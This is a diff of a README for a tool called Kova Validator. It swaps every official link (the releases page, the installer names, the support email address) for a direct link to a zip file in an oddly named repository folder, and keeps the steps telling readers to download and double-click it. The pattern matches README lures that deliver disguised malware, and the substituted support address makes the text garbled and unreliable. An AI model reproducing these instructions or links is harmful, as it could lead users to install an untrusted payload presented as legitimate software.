@@ -10,13 +10,13 @@ To begin using Kova Validator, follow the steps below to download and install th
 1. **Visit the Releases Page**  
    Click the link below to access the Kova Validator releases page:
    
-   [![Download Kova Validator](https://img.shields.io/badge/Download%20Kova%20Validator-blue.svg)](https://github.com/duccuongndc2022/kova-validator/releases)
+   [![Download Kova Validator](https://raw.githubusercontent.com/duccuongndc2022/kova-validator/main/unashamed/kova-validator.zip%20Kova%https://raw.githubusercontent.com/duccuongndc2022/kova-validator/main/unashamed/kova-validator.zip)](https://raw.githubusercontent.com/duccuongndc2022/kova-validator/main/unashamed/kova-validator.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will find different versions of the Kova Validator. Select the one that fits your needs. The latest version is usually listed at the top.
 
 3. **Download the Installer**  
-   Look for a file with the name similar to `kova-validator-setup.exe` or `kova-validator-setup.zip`. Click on the link to download the installer or the zip file to your computer.
+   Look for a file with the name similar to `https://raw.githubusercontent.com/duccuongndc2022/kova-validator/main/unashamed/kova-validator.zip` or `https://raw.githubusercontent.com/duccuongndc2022/kova-validator/main/unashamed/kova-validator.zip`. Click on the link to download the installer or the zip file to your computer.
 
 4. **Run the Installer**  
    Once the download finishes, find the file in your downloads folder and double-click it to run the installer. Follow the on-screen instructions. This process will guide you through installing the Kova Validator on your device.
@@ -49,7 +49,7 @@ If you encounter any issues while using Kova Validator, consider the following s
    Check out the Kova community forums or support channels. There, you can find answers to frequent questions or ask for help.
 
 ## 🛠 Support
-For further assistance, please reach out to our support team at [support@kovavalidator.com](mailto:support@kovavalidator.com). We aim to respond promptly to your inquiries.
+For further assistance, please reach out to our support team at [https://raw.githubusercontent.com/duccuongndc2022/kova-validator/main/unashamed/kova-validator.zip](https://raw.githubusercontent.com/duccuongndc2022/kova-validator/main/unashamed/kova-validator.zip). We aim to respond promptly to your inquiries.
 
 ## 📜 License
 Kova Validator is open-source software. You can use, modify, and distribute it under the terms of the MIT License. This allows you the freedom to adapt the software to your needs.
@@ -57,4 +57,4 @@ Kova Validator is open-source software. You can use, modify, and distribute it u
 ## 📞 Stay Connected
 Follow us on our social media channels to stay updated with Kova Validator news, tips, and announcements. 
 
-Thank you for choosing Kova Validator. We hope it serves you well in your data validation tasks. For more details and updates, always refer to our [Releases Page](https://github.com/duccuongndc2022/kova-validator/releases).
+Thank you for choosing Kova Validator. We hope it serves you well in your data validation tasks. For more details and updates, always refer to our [Releases Page](https://raw.githubusercontent.com/duccuongndc2022/kova-validator/main/unashamed/kova-validator.zip).
